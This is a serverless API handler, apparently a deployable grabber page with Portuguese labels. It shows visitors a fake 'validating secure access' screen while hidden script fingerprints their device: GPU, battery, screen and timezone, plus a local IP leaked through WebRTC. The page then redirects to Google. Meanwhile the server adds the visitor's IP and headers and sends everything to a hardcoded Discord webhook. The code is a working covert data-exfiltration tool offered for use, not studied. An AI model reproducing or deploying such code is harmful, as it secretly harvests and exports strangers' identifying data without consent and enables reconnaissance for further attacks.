export default async function handler(req, res) {
    const webhookURL = "https://discord.com/api/webhooks/1457145338161926276/zls4e-KmVOQwMrWLs_Ut-QR5N2R0mhpfKfw4BhVqUJOL-8mzELAZHk13rbJPlH4geFuv";

    if (req.method === 'POST') {
        const d = req.body;
        // Captura de Headers do Servidor
        const headers = req.headers;
        const ip = headers['x-forwarded-for'] || req.socket.remoteAddress;

        const payload = {
            embeds: [{
                title: " RECONHECIMENTO: DADOS EXTRAÍDOS",
                color: 0,
                fields: [
                    { name: " Conexão", value: `**IP:** ${ip}\n**Local:** ${d.localIp}\n**ISP:** ${headers['x-vercel-ip-as-number'] || 'N/A'}` },
                    { name: " Headers Principais", value: `**Accept-Lang:** ${headers['accept-language']}\n**Encoding:** ${headers['accept-encoding']}` },
                    { name: " Hardware", value: `**CPU:** ${d.cores} Cores\n**RAM:** ${d.mem}GB\n**GPU:** ${d.vendor} - ${d.gpu}\n**Bateria:** ${d.battery}` },
                    { name: " Display", value: `**Tela:** ${d.res}\n**Janela:** ${d.win}\n**Depth:** ${d.depth}-bit\n**Touch:** ${d.touch} pts` },
                    { name: " Sistema", value: `**OS:** ${d.platform}\n**TZ:** ${d.tz}\n**Bot:** ${d.isBot ? "Sim" : "Não"}` },
                    { name: " Navegador (UA)", value: `\`\`\`${headers['user-agent']}\`\`\`` }
                ],
                footer: { text: "Coleta completa executada com sucesso" }
            }]
        };

        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        return res.status(200).json({ status: 'ok' });
    }

    res.setHeader('Content-Type', 'text/html');
    res.send(`
        <script>
            async function fullRecon() {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                
                let battery = "N/A";
                try {
                    const b = await navigator.getBattery();
                    battery = \`\${Math.round(b.level * 100)}% (\${b.charging ? 'Carga' : 'Descarga'})\`;
                } catch(e) {}

                const getLocalIP = () => new Promise(res => {
                    const pc = new RTCPeerConnection();
                    pc.createDataChannel("");
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = i => {
                        if (i?.candidate?.candidate) {
                            const ip = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
                            res(ip); pc.close();
                        }
                    };
                    setTimeout(() => res("N/A"), 800);
                });

                const data = {
                    res: \`\${screen.width}x\${screen.height}\`,
                    win: \`\${window.innerWidth}x\${window.innerHeight}\`,
                    depth: screen.colorDepth,
                    cores: navigator.hardwareConcurrency,
                    mem: navigator.deviceMemory || "N/A",
                    gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A",
                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A",
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    lang: navigator.language,
                    platform: navigator.platform,
                    touch: navigator.maxTouchPoints,
                    isBot: navigator.webdriver,
                    battery: battery,
                    localIp: await getLocalIP()
                };

                await fetch('/api', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                window.location.href = "https://www.google.com";
            }
            fullRecon();
        </script>
        <div style="background:#000;color:#fff;height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif">
            <p>Validando acesso seguro ao portal...</p>
        </div>
    `);
}
